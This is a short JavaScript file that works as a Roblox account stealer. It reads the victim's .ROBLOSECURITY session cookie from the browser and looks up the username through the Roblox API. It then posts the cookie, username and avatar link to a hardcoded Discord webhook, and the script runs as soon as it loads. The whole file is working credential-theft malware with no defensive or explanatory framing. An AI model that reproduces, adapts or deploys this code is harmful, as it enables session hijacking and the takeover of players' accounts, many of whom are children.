// Replace with your Discord webhook URL
const webhookUrl = 'https://discord.com/api/webhooks/1411889557498232973/n2YLjdbDmZvylu5lJI0_bK0PJK6bxy7zdwzKH3ni0VanRGd0-6FmCqXzDCuCatM2QjR5';

function getRobloxUserInfo(cookie) {
    return fetch('https://users.roblox.com/v1/users/authenticated', {
        method: 'GET',
        headers: {
            'Cookie': `.ROBLOSECURITY=${cookie}`
        }
    }).then(response => response.json());
}

function sendCookieToDiscord(cookie, username, avatarUrl) {
    const data = {
        content: `New cookie logged:\nUsername: ${username}\nAvatar: ${avatarUrl}\nCookie: ${cookie}`
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    }).then(response => {
        if (response.ok) {
            console.log('Cookie sent to Discord!');
        } else {
            console.error('Failed to send cookie to Discord.', response.status, response.statusText);
        }
    }).catch(error => {
        console.error('Error:', error);
    });
}

function logCookie() {
    const cookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')).split('=')[1];

    if (cookie) {
        getRobloxUserInfo(cookie).then(userInfo => {
            const username = userInfo.name;
            const avatarUrl = `https://www.roblox.com/Thumbs/Avatar.ashx?x=420&y=420&username=${username}`;

            sendCookieToDiscord(cookie, username, avatarUrl);
        }).catch(error => {
            console.error('Error retrieving user info:', error);
        });
    } else {
        console.error('Cookie not found');
    }
}

// Call the function to log the cookie
logCookie();

